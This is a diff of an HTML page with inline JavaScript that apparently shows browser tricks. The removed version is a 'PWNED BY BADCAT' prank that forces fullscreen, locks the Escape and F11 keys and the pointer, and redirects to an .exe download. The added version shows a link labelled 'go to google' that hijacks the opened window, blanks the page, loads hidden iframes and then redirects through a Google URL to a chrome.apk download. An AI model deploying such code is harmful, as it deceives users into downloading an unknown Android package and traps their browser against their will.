@@ -1,76 +1,39 @@
-<body></body>
-<h1>Click Anywhere</h1>
+<body>
+<a id=test href="https://www.google.com/" onclick=foo()><h1>go to google</h1></a>
+</body>
 <script>
-    let words = ["PWNED", "BY", "BADCAT"];
-    let wordIndex = 0;
-    let pointerLocked = false; // Menandai status pointer lock
-
-    document.body.onclick = (event) => {
-        // Cek apakah elemen yang diklik adalah input atau button
-        const isInputOrButton = event.target.tagName === 'INPUT' || event.target.tagName === 'BUTTON';
-        if (!isInputOrButton) {
-            setTimeout(() => {
-                document.documentElement.requestFullscreen().then(() => {
-                    showContent(); // Menampilkan konten setelah fullscreen diaktifkan
-
-                    // Mengunci tombol Escape dan F11 setelah mode fullscreen aktif
-                    navigator.keyboard.lock(["Escape", "F11"]).catch((err) => {
-                        console.log("Error saat mengunci keyboard:", err);
-                    });
-                    
-                    // Mengunci pointer
-                    document.body.style.cursor = 'none'; // Menyembunyikan pointer
-                    document.body.requestPointerLock(); // Mengunci pointer
-                    pointerLocked = true; // Set pointerLocked ke true
-                }).catch((err) => {
-                    console.log("Error saat masuk fullscreen:", err);
-                });
-            }, 399);
-            
-            // Ubah halaman setelah beberapa saat (sesuaikan waktu sesuai kebutuhan)
-            setTimeout(() => document.location = "https://testsafebrowsing.appspot.com/s/content.exe", 599);
-        }
-    };
-
-    function showContent() {
-        var content = `
-            <div id="imageContainer" style="background-image: url('https://i.ibb.co/com/m8RJ1rq/PWNED-BY-BADCAT.gif'); text-align: center; margin-top: 20px;">
-               
-            </div>
-            <div id="messageContainer" style="font-size: 48px; color: black; text-align: center; margin-top: 20px;"></div>`;
-        document.body.innerHTML = content;
-    }
-
-    document.addEventListener('keydown', (e) => {
-        if (e.code === 'Escape' || e.code === 'F11') {
-            e.preventDefault(); // Mencegah tindakan default pada tombol Escape dan F11
-            if (wordIndex < words.length) {
-                // Menampilkan kata berikutnya dari kalimat "PWNED BY BADCAT"
-                document.getElementById('messageContainer').innerHTML += words[wordIndex] + " ";
-                wordIndex++;
-            }
-            // Menampilkan pesan lengkap setelah semua kata ditampilkan
-            if (wordIndex === words.length) {
-                document.getElementById('messageContainer').innerHTML = "PWNED BY BADCAT";
-            }
-            console.log(`Tombol ${e.code} ditekan, menampilkan: ${words[wordIndex - 1]}`);
-        }
-    });
-
-    // Mengatur event untuk mengeluarkan pointer lock ketika mouse diklik
-    document.addEventListener('click', () => {
-        if (document.pointerLockElement) {
-            document.exitPointerLock();
-            document.body.style.cursor = 'auto'; // Menampilkan pointer lagi
-            pointerLocked = false; // Set pointerLocked ke false
-        }
-    });
-
-    // Mencegah klik mouse berfungsi ketika pointer dikunci
-    document.addEventListener('click', (event) => {
-        if (pointerLocked) {
-            event.preventDefault(); // Mencegah tindakan default
-            console.log('Klik mouse tidak berfungsi saat pointer terkunci.');
-        }
-    });
+var w;
+var t;
+var z;
+function foo(){
+document.getElementById("test").href="#";
+w = window.open("fake");
+t = setInterval('bar()',1);
+}
+function bar(){
+if(w.location.href !== 'fake'){
+document.body.innerHTML = "";
+slow();
+w.location.href = 'https://www.google.com';
+clearInterval(t);
+z = setInterval('baz()',1);
+}
+}
+function baz(){
+try{
+w.location.href !== 'fake';
+}
+catch (e){
+setTimeout("w.location.replace('https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3');", 3000);
+clearInterval(z);
+}
+}
+function slow() {
+for (i=0; i<10; i++ ) {
+iframe = document.createElement("iframe");
+iframe.src = 'https://www.google.com/';
+iframe.style = 'display:none';
+document.body.appendChild(iframe);
+}
+}
 </script>
